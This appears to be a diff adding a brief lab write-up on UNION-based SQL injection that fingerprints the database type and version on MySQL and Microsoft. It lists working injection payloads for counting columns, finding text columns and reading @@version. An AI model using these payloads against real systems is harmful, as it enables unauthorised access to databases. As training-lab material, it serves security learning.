@@ -1,0 +1,17 @@
+SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+It's easier to do this in Burp repeater, but let's do in a browser.
+
+Let's identify the number of columns. Based on the cheatsheet, a mysql database has "-- " as a comment. Note the space. We'll translate it to %20 in our URL:
+
+'+UNION+SELECT+NULL,NULL--%20
+
+Finding text columns:
+
+'+UNION+SELECT+'asdf','asdf'--%20
+
+Once again, by checking the cheatsheet, we can get the version.
+
+'+UNION+SELECT+@@version,'asdf'--%20
+
+Lab complete.
